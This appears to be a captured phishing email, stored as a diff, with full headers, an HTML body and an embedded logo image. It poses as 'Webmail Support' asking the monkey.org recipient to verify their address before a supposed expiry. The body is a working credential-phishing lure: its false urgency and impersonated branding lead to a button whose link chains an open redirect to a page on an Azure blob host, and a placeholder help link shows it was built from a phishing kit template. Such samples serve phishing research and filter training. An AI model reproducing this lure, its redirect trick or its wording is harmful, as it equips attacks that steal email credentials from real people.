@@ -1,0 +1,199 @@
+Return-Path: erin@livemala.com
+Delivered-To: jose@monkey.org
+X-FDA: 84107253678.40.915BB69
+Received: from gross.livemala.com (gross.livemala.com [104.37.1.21])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id 9C2E3A000C
+	for <jose@monkey.org>; Fri, 14 Nov 2025 00:05:07 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;
+	dkim=pass header.d=livemala.com header.s=dkim header.b=Jg1wisGL;
+	spf=pass (imf10.b.hostedemail.com: domain of erin@livemala.com designates
+ 104.37.1.21 as permitted sender) smtp.mailfrom=erin@livemala.com;
+	dmarc=pass (policy=none) header.from=livemala.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1763078707;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=GZG7bgNgabXV+QGWsTxLzMju17DJbzd4whSgqFdpj54=;
+	b=FhDD8HxITkj3j40X4JN2g1OnMBtWN8SLdxdsoETMripBXUqKbuLaEkMJRo0gxkBoG5ie4U
+	fykpYWHZqFASGwOEXNCCXouaNaTM2tnNZTDW/5gQNvgpY61OQnkkaqDYQAXc8lfXXQMdHF
+	IN3fJNo0+BbajO96QnnkvbBMPP9TWlw=
+ARC-Authentication-Results: i=1;
+	imf10.b.hostedemail.com;
+	dkim=pass header.d=livemala.com header.s=dkim header.b=Jg1wisGL;
+	spf=pass (imf10.b.hostedemail.com: domain of erin@livemala.com designates
+ 104.37.1.21 as permitted sender) smtp.mailfrom=erin@livemala.com;
+	dmarc=pass (policy=none) header.from=livemala.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1763078707; a=rsa-sha256;
+	cv=none;
+	b=3LcKC8A0fNnD3t9Ag2FsaX+eWokqCZwKPkQtE2LZ/xfmF6hHAIUqPZHh/b7ZyMm8voFVVC
+	jtZI97CZnvc2JMpFmSI/JDNsmDaThcQLPSX6rZwjd65m1bd3Tg2hm1scAI7pw3CuHS38op
+	K+An8XNNoyOzwHnEaB4zZOmCD0SOhxk=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=livemala.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=erin@livemala.com;
+ bh=EGyzD4DBdw2jvplxPEKlONYT6VQ=;
+ b=Jg1wisGLQVMfnFKfd9ytqoVJUZhMmfmbt4k7Wf/5aznLy+alxb4aR7fmxuVoRopcSfIjG+YIACHp
+   SKITU8MVK6W0wcyfXy9SV5iS7XUF7VI8qow41DpiGsUMj+vKtWRsgBKxGPor4cLpMw+/UBPZ85QZ
+   oNj40vfzlNFAOD+t8pgJrIirti9o3JGYgAJcb35xQkWU8ZqPKP1sg7SEASqvABNclU5abWaTQH29
+   57hWjoGatONJrFVz7Ev1S5yMBYGBSXsS845UMxtWRY9Zihjp7ijE8Slnhm7PfZE7Ixav2oxOHVrR
+   OpxRelX5bGjHvDPbvq1/LiJlAwcFEomA8GcBGA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=livemala.com;
+ b=MwS6xBP8iPcWaKbpHXuBP030wPT523XpKeIkS2/6RZPHWee39hkAIwMhiNrhYpw5Jb49St3idfSK
+   cUvSBQL+KRo3KJzWYTDyBKgwlDguKS8QqgMncJGB6aHzSBKhWucE7gsjsR21VNNUYFKm18WiyEY/
+   TQfJxHyM1Ql92WrKLATIsChAHfjkTkPBzOkh0vQWx1yqMYhH00+A3MCHGIaxVzFnoamQnPC5g7VK
+   pjkKBLjFEaJld0hNnVCusfaXk4Tf/ybCXXcJIey3cnQgKVO1GsVB2tXrO7rBQNNqqvUWymTaqz7r
+   szn5YG5qVi47YmLCk5Vw5gb/+GcSl3GrHoZgUw==;
+From: Webmail Support monkey.org  <erin@livemala.com>
+To: jose@monkey.org
+Subject: RE:Confirm receipt and authenticity of your emails
+Date: 13 Nov 2025 16:05:04 -0800
+Message-ID: <20251113160504.9EC21ADEB7ED0A74@livemala.com>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_1B09040C.CF463293"
+X-Rspamd-Queue-Id: 9C2E3A000C
+X-Stat-Signature: myu9biycaecpqoyas1qkcomrig3b9bb8
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.30
+X-Rspamd-Server: rspam09
+X-HE-Tag: 1763078707-334009
+X-HE-Meta: 
+ U2FsdGVkX1/oNqdRzYb8OqMIdpvHCK2gDhIM2wQ7cSGmEaWzH8SbeOi9/Rwyv6XCAPGBygLZ1/WDSo9py1rvcGxNQWUyY2g3bgZGLSZ8V24DJh0QDLmaAqASf3Wr7+YnraDGoqB0/JFfIY87HbHj8DcLmDCiijpJBOIzS7aWiTo4Zeh6VfnxaY7joQLvJQ9anFsGmtK9gyKBOEwm9tq9i83uVkxqnOK9j/VtNKL0nGBTrJD08zuL3ppzeG0NrfCHwq5zxr9veDCBVXBoEl5QXh39VO7eqIVTBWtqbXePk1opqCXvTIDUDUaccDvcRAsUZtlY2fZVUCwnV17LTmZkFZpAzBURvu+jwBdV0FrXDtszfMOZ0RuW1M5RIq1C2W8H6x0f76zme8Ah2bWIPGd4eiIXAckRgtgbS5R3MfZs4d/O+Qt8gJ2WTP+1VTPsWlbpGlEwKRT/ryvIlyXCxEMEmsIgtaVr+NXutssllYz0TgsQTJZJt5V6PJidK4xzjw3+TCeXzDIl3Ls4SwX+NyzLbb55FK5cFa19CNiTzGbXQLl1r59W+iW21MbymXqGFs5uzzRChXnfr+Iq58f3vV7UMaGFr6iNFhfKxFhiuHp436ue0jopaPVawq9SfRlrNBYyLsNoSoe+l9ZnSSNnHu5/JRCuci0U3TN2VIgbn26ec1N51roHdt9MatZaVbw59TiMSnfgrF3JPyTcz137hqizSipGoV/5hvppTnTu9qfpBz6oxI4Bvhbltz2SUbVg4llbfl+0m9lx5IG1utATUElY+Lkir9EwhykSL3Hj57ppX32i5mvSfyyF7V7SBihInIcGHlS5kO6o66rZAw2A+9JsIJwf9HQVWwpioaHcxwYlgTszb91nUx91QFIN3CS63bzcw7RMO8/NTXkwLVL1Pk0oFFZqsW6XTkJtTSrdQG4IkWdvpFjqDr7tGMNPYIPIPbSl4H5Ah9vyC8RzpVoTghEgfzHXvog
+ y38GbLH5mf4ZK3WGYk6EaPEp1CZar8IPP16R7QcIiXz1RVE6dkXvh4LGrKHgXhkIvTwIWuAXXW819bvb2ThjYSHFWmY/42yJ6No0t7XlPINbt9CRh+K/lziGZyo2pUeUPePqA0Ka/T7w6c3Dz074YZsnuHD1p2nmUIYlZDYv6W8Zo7A0zKwtWz8jKa3Vk361foj3LZhJa0FaRpWCEnCn308bIUHyudEA8tQSrHP/uKIt6ECwXY41Awsf0a5zzEt/mvod0U0BliDRH1g6UabMfiVvqLc8CZsbxGJYxJ918zBq/DPxObuVPyzwJl8hLIKjiN4liYDw15iB7DVtlnf2fhfYfesTZfuWU1yizDhI9XdVEEn4=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 434
+
+
+------=_NextPart_000_0012_1B09040C.CF463293
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: rgb(20=
+4,204,204) 1px solid; HEIGHT: 582px; FONT-FAMILY: Arial, sans-serif; BORDER=
+-RIGHT: rgb(204,204,204) 1px solid; WIDTH: 582px; WHITE-SPACE: normal; WORD=
+-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(204,204,204) 1=
+px solid; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FON=
+T-STYLE: normal; BORDER-LEFT: rgb(204,204,204) 1px solid; ORPHANS: 2; WIDOW=
+S: 2; LETTER-SPACING: normal; BACKGROUND-COLOR:=20
+rgb(255,255,255); font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color: initial" cellspacing=3D"0=
+" cellpadding=3D"0" width=3D"582">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 20px; PADDING-RIGHT: 20px" align=3D"left">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style=3D"BORDER-=
+TOP-STYLE: none; BOX-SIZING: border-box; HEIGHT: 127px; WIDTH: 409px; VERTI=
+CAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; BORDER-RIGHT-STYLE: none; BOR=
+DER-LEFT-STYLE: none" alt=3D"Webmail Login" src=3D"cid:images" width=3D"291=
+" height=3D"174"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 20px; PADDING-RIGHT: 20px">
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 1.5em; FONT-WEIGHT: 700; CO=
+LOR: rgb(51,51,51); MARGIN-TOP: 0px; LINE-HEIGHT: 1.2">Verify Your jose@mon=
+key.org Email Address</H2>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">Hello info,</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">To continue using your=
+ jose@monkey.org please verify that this is your email address.</P>
+<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
+ing=3D"0" cellpadding=3D"0" width=3D"100%">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 20px; PADDING-RIGHT: 20px" align=3D"center">
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-WEIGHT: bol=
+d; COLOR: rgb(255,255,255); PADDING-BOTTOM: 15px; PADDING-TOP: 15px; PADDIN=
+G-LEFT: 30px; PADDING-RIGHT: 30px; BACKGROUND-COLOR: rgb(255,119,0); border=
+-radius: 5px" href=3D"https://www.dentaljjang.com/shop/bannerhit.php?bn_id=
+=3D23&amp;url=3Dhttps://transmittedbankrecord.blob.core.windows.net/sharedv=
+iaadobeonline/NosFriend2025.html#?cms=3Djose@monkey.org" rel=3Dnoreferrer t=
+arget=3D_blank>Continue Verification Here</A></TD></TR></TBODY>
+</TABLE>
+<P style=3D"BOX-SIZING: border-box; COLOR: red; MARGIN-TOP: 0px">Authentica=
+tion Request To Expire on 11/13/2025 4:05:04 p.m.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">This link will expire =
+11/13/2025 4:05:04 p.m.. You might lose access to your mailbox if action is=
+ not taken immediately.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">For help, Contact us t=
+hrough our<SPAN>&nbsp;</SPAN><A style=3D"BOX-SIZING: border-box; TEXT-DECOR=
+ATION: none; COLOR: rgb(0,123,255); BACKGROUND-COLOR: transparent" href=3D"=
+https://your_fake_help_link/" rel=3Dnoreferrer target=3D_blank>Help center<=
+/A>.</P></TD></TR></TBODY></TABLE></BODY></HTML>
+------=_NextPart_000_0012_1B09040C.CF463293
+Content-Type: application/octet-stream; name="images"
+Content-Transfer-Encoding: base64
+Content-ID: <images>
+
+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
+AABJRU5ErkJggg==
+
+------=_NextPart_000_0012_1B09040C.CF463293--
+
+
